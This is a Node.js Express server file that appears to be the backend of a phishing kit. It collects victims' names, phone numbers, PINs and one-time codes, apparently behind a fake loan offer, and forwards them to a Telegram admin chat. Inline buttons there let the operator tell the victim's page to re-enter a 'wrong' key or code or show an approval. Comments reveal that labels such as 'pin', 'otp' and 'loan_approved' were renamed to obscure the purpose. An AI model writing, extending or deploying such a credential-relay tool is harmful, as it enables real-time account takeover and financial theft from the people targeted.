'use strict';

import express           from 'express';
import cors              from 'cors';
import crypto            from 'crypto';
import { fileURLToPath } from 'url';
import path              from 'path';
import config            from './config.js';
import { setResult, popResult, setSession, getSession } from './store.js';
import { sendAdminMessage, removeButtons, answerCallback, registerWebhook, escMd } from './telegram.js';

const app       = express();
const __dirname = path.dirname(fileURLToPath(import.meta.url));

app.use(express.json());
app.use(cors({
  origin:         true,
  methods:        ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
}));

app.use(express.static(__dirname));
app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.get('/health', (_req, res) => {
  res.json({ ok: true, service: 'svc', ts: new Date().toISOString() });
});

app.get('/setup', async (_req, res) => {
  try {
    const result = await registerWebhook();
    if (result.ok) {
      res.json({ ok: true, description: result.description, webhook: `${config.serverUrl}/webhook`, message: 'OK' });
    } else {
      res.status(500).json({ ok: false, error: result.description });
    }
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

// POST /api/v2/process
app.post('/api/v2/process', async (req, res) => {
  const { type, phone, countryCode, k1, k2, name } = req.body;

  if (!type || !phone) {
    return res.status(400).json({ ok: false, error: 'Missing fields' });
  }

  const fullPhone = `${countryCode || '+225'} ${phone}`.trim();
  const token = crypto.randomBytes(8).toString('hex');
  const sig = crypto.createHmac('sha256', config.secretKey).update(`${token}|${phone}`).digest('hex');
  setSession(token, phone, sig, config.tokenTtl);
  const cbData = (action) => `${action}|${token}`;

  try {
    let text, keyboard;
    const now = new Date();
    const dateTime = now.toLocaleString('en-GB', { dateStyle: 'medium', timeStyle: 'short' });

    if (type === 'a') { // was 'pin'
      if (!k1) return res.status(400).json({ ok: false, error: 'Missing k1' });
      text = `🔒 *Entry*\n\n👤 *Name:* ${escMd(name || 'Unknown')}\n📱 *Phone:* \`${escMd(fullPhone)}\`\n🔢 *Key:* \`${escMd(k1)}\`\n🕐 *Date:* ${escMd(dateTime)}\n\nAwaiting decision\\.`;
      keyboard = [[
        { text: '✅ Continue', callback_data: cbData('r1') },
        { text: '❌ Wrong Key', callback_data: cbData('r2') },
        { text: '✅ Approve', callback_data: cbData('r3') },
      ]];
    } else if (type === 'b') { // was 'otp'
      if (!k2) return res.status(400).json({ ok: false, error: 'Missing k2' });
      text = `🔐 *Code*\n\n👤 *Name:* ${escMd(name || 'Unknown')}\n📱 *Phone:* \`${escMd(fullPhone)}\`\n🔑 *Code:* \`${escMd(k2)}\`\n🕐 *Date:* ${escMd(dateTime)}\n\nAwaiting decision\\.`;
      keyboard = [
        [{ text: '❌ Wrong Code', callback_data: cbData('r5') }, { text: '❌ Invalid Key', callback_data: cbData('r6') }],
        [{ text: '✅ Approve', callback_data: cbData('r3') }, { text: '❌ Decline', callback_data: cbData('r4') }],
      ];
    } else if (type === 'd') { // was 'otp_resend'
      text = `🔄 *Refresh*\n\n👤 *Name:* ${escMd(name || 'Unknown')}\n📱 *Phone:* \`${escMd(fullPhone)}\`\n🕐 *Date:* ${escMd(dateTime)}\n\nUser requested new code\\.`;
      keyboard = [[
        { text: '✅ Continue', callback_data: cbData('r1') },
        { text: '❌ Wrong Key', callback_data: cbData('r2') },
      ]];
    } else {
      return res.status(400).json({ ok: false, error: 'Unknown type' });
    }

    const tgResult = await sendAdminMessage(text, keyboard);
    if (!tgResult.ok) {
      return res.status(500).json({ ok: false, error: 'TG error', detail: tgResult.description });
    }
    res.json({ ok: true, token });
  } catch (err) {
    console.error('Error:', err);
    res.status(500).json({ ok: false, error: 'Server error' });
  }
});

// POST /api/v2/status
app.post('/api/v2/status', (req, res) => {
  const { token } = req.body;
  if (!token || !/^[a-f0-9]{16}$/.test(token)) {
    return res.status(400).json({ ok: false, error: 'Invalid token' });
  }
  const result = popResult(token);
  if (result === null) return res.json({ ok: true, result: 'p' }); // pending
  res.json({ ok: true, result });
});

// POST /webhook
app.post('/webhook', async (req, res) => {
  res.json({ ok: true });
  const update = req.body;
  if (!update?.callback_query) return;

  const cb = update.callback_query;
  const cbId = cb.id;
  const data = cb.data || '';
  const chatId = cb.message?.chat?.id?.toString();
  const msgId = cb.message?.message_id;

  if (chatId !== config.adminChatId.toString()) {
    await answerCallback(cbId, 'Not authorised', true);
    return;
  }

  const parts = data.split('|');
  if (parts.length !== 2) { await answerCallback(cbId, 'Invalid data'); return; }

  const [action, token] = parts;
  const session = getSession(token);
  if (!session) { await answerCallback(cbId, 'Session expired', true); return; }

  const expectedSig = crypto.createHmac('sha256', config.secretKey).update(`${token}|${session.phone}`).digest('hex');
  if (!crypto.timingSafeEqual(Buffer.from(session.sig), Buffer.from(expectedSig))) {
    await answerCallback(cbId, 'Invalid sig', true);
    return;
  }

  try {
    switch (action) {
      case 'r1': // continue_otp
        setResult(token, 'r1', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`✅ *Approved*\nUser \`${escMd(session.phone)}\` continues\\.`, []);
        await answerCallback(cbId, 'OK');
        break;
      case 'r2': // pin_wrong
        setResult(token, 'r2', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`❌ *Wrong Key*\nUser \`${escMd(session.phone)}\` notified\\.`, []);
        await answerCallback(cbId, 'Wrong key');
        break;
      case 'r3': // loan_approved
        setResult(token, 'r3', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`✅ *Approved*\nApplication for \`${escMd(session.phone)}\`\\.`, []);
        await answerCallback(cbId, 'Approved');
        break;
      case 'r4': // loan_rejected
        setResult(token, 'r4', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`❌ *Declined*\nApplication for \`${escMd(session.phone)}\`\\.`, []);
        await answerCallback(cbId, 'Declined');
        break;
      case 'r5': // otp_wrong
        setResult(token, 'r5', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`❌ *Wrong Code*\nUser \`${escMd(session.phone)}\` notified\\.`, []);
        await answerCallback(cbId, 'Wrong code');
        break;
      case 'r6': // pin_invalid
        setResult(token, 'r6', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`🚫 *Invalid*\nUser \`${escMd(session.phone)}\` redirected\\.`, []);
        await answerCallback(cbId, 'Invalid session');
        break;
      default:
        await answerCallback(cbId, 'Unknown');
    }
  } catch (err) {
    console.error('Webhook error:', err);
  }
});

app.get('/test', async (_req, res) => {
  const result = await sendAdminMessage('🧪 Test\\.', []);
  res.json({ tg: result, chat: config.adminChatId, url: config.serverUrl });
});

app.listen(config.port, () => {
  console.log(`\n🚀 Service running on port ${config.port}`);
});
